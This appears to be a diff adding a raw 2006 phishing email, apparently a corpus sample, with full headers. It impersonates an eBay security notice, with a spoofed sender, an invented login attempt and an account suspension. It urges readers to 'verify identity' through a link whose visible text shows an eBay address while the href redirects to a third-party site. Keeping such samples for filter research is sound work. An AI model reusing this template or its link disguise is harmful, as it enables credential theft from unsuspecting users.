@@ -1,0 +1,62 @@
+Return-Path: <root@dc2-web15.assortedinternet.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+	by example.com (Postfix) with ESMTP id 025324686E
+	for <user@login.example.com>; Tue, 19 Sep 2006 13:03:54 -0400 (EDT)
+Received: from dc2-web15.assortedinternet.com (dc2-web15.assortedinternet.com [66.36.233.162])
+	by mail.example.org (Postfix) with ESMTP id 0A6FB6FA5C2
+	for <user@example.com>; Tue, 19 Sep 2006 13:03:54 -0400 (EDT)
+Received: from root by dc2-web15.assortedinternet.com with local (Exim 4.52)
+	id 1GPj0i-00062v-AF
+	for user@example.com; Tue, 19 Sep 2006 13:03:52 -0400
+From: "eBay" <aw-confirm@ebay.com>
+MIME-Version: 1.0 Content-Type: text/html\r\n
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit\r\n
+Subject: FPA NOTICE: Suspicious Activity -Section 9
+Message-Id: <E1GPj0i-00062v-AF@dc2-web15.assortedinternet.com>
+Date: Tue, 19 Sep 2006 13:03:52 -0400
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - dc2-web15.assortedinternet.com
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [0 0] / [47 12]
+X-AntiAbuse: Sender Address Domain - dc2-web15.assortedinternet.com
+X-Source: /bin/bash
+X-Source-Args: bash imapd 
+X-Source-Dir: /usr/local/games/lobe.gif
+To: undisclosed-recipients:;
+Content-Length: 3589
+Lines: 26
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 285
+
+<P><FONT face=Arial, Verdana size=2>Dear eBay member,</FONT></P>
+<P><FONT face=Arial, Verdana size=2>We recently noticed one or more attempts to log in to your eBay account from a foreign IP address and we have reasons to believe that your account was accesed by a third party without your authorization. <BR>If you recently accessed your account while traveling, the unusual log in attempts may have been initiated by you.</FONT></P>
+<P><FONT face=Arial, Verdana size=2>The login attempt was made from:</FONT></P>
+<P><FONT face=Arial, Verdana size=2>IP address: 154.106.12.15</FONT></P>
+<P><FONT face=Arial, Verdana size=2>IS Host: cache-154.proxyes.aol.com.</FONT></P>
+<P><FONT face=Arial, Verdana size=2>Due the security measures we temporarily suspended your account.<BR>If you are the rightful holder of the account, click on the link below, fill the form and then submit as we try to verify your identity:</FONT></P>
+<P><A target="_blank" href="http://signin.ebay.com/ws/eBayISAPI.dll?SignInMCAlert&ru=http://www.wondermailing.it/https:/signin.ebay.com/ws/eBayISAPI.dll/SignInco_partnerId=/UserId=/UsingSSL=/existingEmail=/migrateVisitor=/index.php "><FONT face=Verdana color=blue size=2>http://signin.ebay.com/ws/eBayISAPI.dll?SignInMCAlert&fsopz3qqsa.catz49979qqs.ocmdzlisting</FONT></A></P>
+<P><FONT face=Arial, Verdana><FONT size=2>Once you will confirm your personal information so we can verify your identity, your account will be re-estabilished. <BR></FONT><BR><FONT size=2>Please note that this suspension does not relieve you of your obligation to pay any fees you may currently owe to eBay.</FONT></FONT>
+<P><font face="Arial, Verdana" size="2">Respectfully,</font><BR>
+  <font face="Arial, Verdana" size="2">Trust and Safety Department<br />
+eBay Inc.<br />
+<a target="_blank"  href="http://www.ebay.com/"  >http://www.ebay.com/</a></font></P>
+<P><FONT face=Arial, Verdana size=2><BR>
+  <BR>
+</FONT></P>
+<p><font color="#666666" size="1" face="Arial, Verdana">This eBay notice was sent to you based on your 
+                              eBay account preferences. If you would like to review 
+                              your notification preferences for other types of 
+                              communications, <a target="_blank"  href="http://cgi3.ebay.com/aw-cgi/eBayISAPI.dll?OptinLoginShow&ssPageName=ADME:X:EOAS:US:11"  ><font color="#666666" size="1" face="Arial, Verdana">click 
+                              here</font></a>. If you would like to receive this email 
+                              in text only, <a target="_blank"  href="http://cgi3.ebay.com/aw-cgi/eBayISAPI.dll?OptinLoginShow&ssPageName=ADME:X:EOAS:US:12"  ><font color="#666666" size="1" face="Arial, Verdana">click 
+here</font></a>. </font></p>
+<p><font color="#666666" size="1" face="Arial, Verdana">As outlined in our User Agreement, eBay will periodically send you information about site changes and enhancements. Visit our <a target="_blank"  href="http://pages.ebay.com/help/policies/privacy-policy.html?ssPageName=ADME:X:EOAS:US:14"  >Privacy Policy</a> and <a target="_blank"  href="http://pages.ebay.com/help/policies/user-agreement.html?ssPageName=ADME:X:EOAS:US:13"  >User Agreement</a> if you have any questions. </font></p>
+<p align="center"><font color="#666666" size="1" face="Arial, Verdana">Copyright © 2006 eBay Inc. All Rights Reserved.<br />
+  Designated trademarks and brands are the property of their respective owners. </font></p>
+<p align="center"><font color="#666666" size="1" face="Arial, Verdana">eBay and the eBay logo are trademarks of eBay Inc.</font></p>
+
